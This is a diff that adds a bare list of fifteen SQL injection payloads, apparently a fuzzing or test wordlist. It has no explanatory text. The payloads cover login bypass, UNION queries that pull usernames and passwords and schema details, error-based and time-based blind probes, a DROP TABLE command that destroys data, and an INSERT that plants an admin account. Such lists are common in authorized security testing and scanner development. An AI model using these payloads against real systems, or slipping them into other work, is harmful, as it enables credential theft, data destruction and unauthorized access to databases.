@@ -1,0 +1,15 @@
+' OR '1'='1' --
+' UNION SELECT NULL, username, password FROM users --
+' AND 1=CONVERT(int, (SELECT @@version)) --
+' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' --
+' OR IF(1=1, SLEEP(5), 0) --
+'; DROP TABLE users; --
+'; INSERT INTO users (username, password) VALUES ('admin', 'password'); --
+' UNION SELECT CONCAT(username, ':', password) FROM users --
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') --
+' /* comment */ --
+' UNION SELECT 1, 'test', 'test' --
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'database_name' --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --
+' OR IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0) --
